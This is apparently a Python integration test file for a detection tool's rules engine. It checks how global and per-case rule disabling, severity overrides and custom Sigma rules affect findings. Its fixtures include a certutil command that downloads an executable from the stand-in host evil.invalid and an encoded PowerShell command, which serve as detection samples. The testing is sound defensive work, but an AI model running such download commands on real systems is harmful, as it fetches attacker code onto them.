from __future__ import annotations

# ruff: noqa: E402
#
# End-to-end coverage of the two mechanisms the Rules page exposes, and of the
# distinction between them that the whole design rests on:
#
#   * a globally disabled rule produces NO finding at all — it is filtered out
#     before the run, which is why disabling is a speed-up;
#   * a per-case disabled rule still produces the finding and demotes it to "info",
#     so it stays reversible without a rebuild.
#
# Confusing the two would look almost identical in the UI and completely different
# on disk, so both are asserted explicitly.

import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from sqlalchemy import select

from app.detect import engine, overrides
from app.rules import database as rules_database
from app.rules import profile as profile_module
from app.rules import store as rules_store
from app.store import cases, database
from app.store.database import Finding, Process


class _IntegrationBase(unittest.TestCase):
    def setUp(self) -> None:
        self.cases_tmp = tempfile.TemporaryDirectory()
        self.rules_tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.cases_tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
            patch.object(rules_database, "get_rules_dir", return_value=Path(self.rules_tmp.name)),
        ]
        for item in self.patches:
            item.start()
        rules_database.dispose_rules_db()
        profile_module.invalidate_cache()

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        rules_database.dispose_rules_db()
        profile_module.invalidate_cache()
        for item in reversed(self.patches):
            item.stop()
        self.cases_tmp.cleanup()
        self.rules_tmp.cleanup()

    def _seed_case(self) -> str:
        case = cases.create_case("rules-integration")
        session = cases.get_session(case["id"])
        try:
            session.add(
                Process(
                    pid=1000, ppid=4, name="certutil.exe",
                    path=r"C:\Windows\System32\certutil.exe",
                    cmdline="certutil.exe -urlcache -split -f http://evil.invalid/a.exe a.exe",
                    session_id="default",
                )
            )
            session.add(
                Process(
                    pid=1001, ppid=4, name="powershell.exe",
                    path=r"C:\Windows\System32\powershell.exe",
                    cmdline="powershell.exe -enc SQBFAFgA",
                    session_id="default",
                )
            )
            session.commit()
        finally:
            session.close()
        return case["id"]

    def _findings(self, case_id: str) -> list[tuple[str, str]]:
        session = cases.get_session(case_id)
        try:
            return [(item.title, item.severity) for item in session.scalars(select(Finding))]
        finally:
            session.close()

    def _rerun(self, case_id: str) -> None:
        """Rebuild detections the way the API's rebuild path does."""
        session = cases.get_session(case_id)
        try:
            session.execute(Finding.__table__.delete())
            session.commit()
        finally:
            session.close()
        profile_module.invalidate_cache()
        engine.run_detections_sync(case_id)


class BuiltinToggleTests(_IntegrationBase):
    def test_baseline_produces_the_expected_findings(self) -> None:
        case_id = self._seed_case()
        engine.run_detections_sync(case_id)
        titles = [title for title, _ in self._findings(case_id)]
        self.assertIn("LOLBin activity: certutil.exe", titles)
        self.assertIn("PowerShell encoded command", titles)

    def test_globally_disabling_a_rule_removes_the_finding_entirely(self) -> None:
        case_id = self._seed_case()
        engine.run_detections_sync(case_id)
        self.assertIn(
            "PowerShell encoded command", [title for title, _ in self._findings(case_id)]
        )

        rules_store.set_builtin_state("cmdline.win.powershell-encoded-command", enabled=False)
        self._rerun(case_id)

        titles = [title for title, _ in self._findings(case_id)]
        # Gone, not demoted. This is what distinguishes the global toggle from the
        # per-case suppression asserted below.
        self.assertNotIn("PowerShell encoded command", titles)
        self.assertIn("LOLBin activity: certutil.exe", titles)

    def test_per_case_disable_still_demotes_rather_than_removes(self) -> None:
        case_id = self._seed_case()
        engine.run_detections_sync(case_id)

        session = cases.get_session(case_id)
        try:
            overrides.set_rule_disabled(session, "powershell-encoded-command", True)
            overrides.apply_overrides(session)
            session.commit()
        finally:
            session.close()

        findings = dict(self._findings(case_id))
        self.assertIn("PowerShell encoded command", findings)
        self.assertEqual(findings["PowerShell encoded command"], "info")

    def test_disabling_one_lolbin_leaves_the_others_alone(self) -> None:
        case_id = self._seed_case()
        rules_store.set_builtin_state("lolbin.certutil", enabled=False)
        self._rerun(case_id)

        titles = [title for title, _ in self._findings(case_id)]
        self.assertNotIn("LOLBin activity: certutil.exe", titles)
        # The shared legacy id "lolbin-activity" must not have suppressed the family.
        self.assertIn("PowerShell encoded command", titles)

    def test_severity_override_is_applied(self) -> None:
        case_id = self._seed_case()
        rules_store.set_builtin_state(
            "cmdline.win.powershell-encoded-command", severity_override="low"
        )
        self._rerun(case_id)
        self.assertEqual(dict(self._findings(case_id))["PowerShell encoded command"], "low")

    def test_re_enabling_restores_the_finding(self) -> None:
        case_id = self._seed_case()
        rules_store.set_builtin_state("cmdline.win.powershell-encoded-command", enabled=False)
        self._rerun(case_id)
        self.assertNotIn(
            "PowerShell encoded command", [title for title, _ in self._findings(case_id)]
        )

        rules_store.set_builtin_state("cmdline.win.powershell-encoded-command", enabled=True)
        self._rerun(case_id)
        self.assertIn(
            "PowerShell encoded command", [title for title, _ in self._findings(case_id)]
        )


class CustomRuleTests(_IntegrationBase):
    CUSTOM_RULE = """
title: Certutil Remote Download
id: 33333333-4444-5555-6666-777777777777
status: experimental
description: Certutil retrieving a remote file
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\certutil.exe'
        CommandLine|contains: '-urlcache'
    condition: selection
tags:
    - attack.t1105
level: critical
"""

    def test_an_enabled_custom_rule_produces_a_finding(self) -> None:
        case_id = self._seed_case()
        rules_store.create_custom_rule(self.CUSTOM_RULE, enabled=True)
        self._rerun(case_id)

        findings = dict(self._findings(case_id))
        self.assertIn("Certutil Remote Download", findings)
        self.assertEqual(findings["Certutil Remote Download"], "critical")

    def test_a_disabled_custom_rule_produces_nothing(self) -> None:
        case_id = self._seed_case()
        rules_store.create_custom_rule(self.CUSTOM_RULE, enabled=False)
        self._rerun(case_id)
        self.assertNotIn(
            "Certutil Remote Download", [title for title, _ in self._findings(case_id)]
        )

    def test_a_custom_rule_carries_its_source_and_technique(self) -> None:
        case_id = self._seed_case()
        rules_store.create_custom_rule(self.CUSTOM_RULE, enabled=True)
        self._rerun(case_id)

        session = cases.get_session(case_id)
        try:
            finding = session.scalars(
                select(Finding).where(Finding.title == "Certutil Remote Download")
            ).first()
            self.assertIsNotNone(finding)
            self.assertTrue(finding.source.startswith("sigma:"))
            self.assertEqual(finding.mitre_techniques, ["T1105"])
            self.assertIn("sigma_rule", finding.evidence)
        finally:
            session.close()

    def test_a_non_matching_custom_rule_stays_silent(self) -> None:
        case_id = self._seed_case()
        rules_store.create_custom_rule(
            self.CUSTOM_RULE.replace("'-urlcache'", "'nonexistent-marker-xyz'")
            .replace("33333333", "44444444"),
            enabled=True,
        )
        self._rerun(case_id)
        self.assertNotIn(
            "Certutil Remote Download", [title for title, _ in self._findings(case_id)]
        )

    def test_one_broken_rule_does_not_disable_the_others(self) -> None:
        """The failure mode this design exists to avoid.

        A rule stored with a bad source must be skipped individually; the rest of
        the rule set has to keep running.
        """
        case_id = self._seed_case()
        rules_store.create_custom_rule(self.CUSTOM_RULE, enabled=True)

        # Corrupt one rule's stored source the way a hand-edited database would.
        session = rules_database.get_rules_session()
        try:
            from app.rules.database import CustomRule

            row = session.scalars(select(CustomRule)).first()
            broken = CustomRule(
                id="55555555-6666-7777-8888-999999999999",
                slug="broken", title="Broken", enabled=True, severity="high",
                techniques=[], yaml_source="title: broken\nnot valid sigma at all",
                content_sha256="deadbeef", compile_status="ok",
            )
            session.add(broken)
            session.commit()
            self.assertIsNotNone(row)
        finally:
            session.close()

        self._rerun(case_id)
        # The good rule still fired despite the broken sibling.
        self.assertIn(
            "Certutil Remote Download", [title for title, _ in self._findings(case_id)]
        )


if __name__ == "__main__":
    unittest.main()
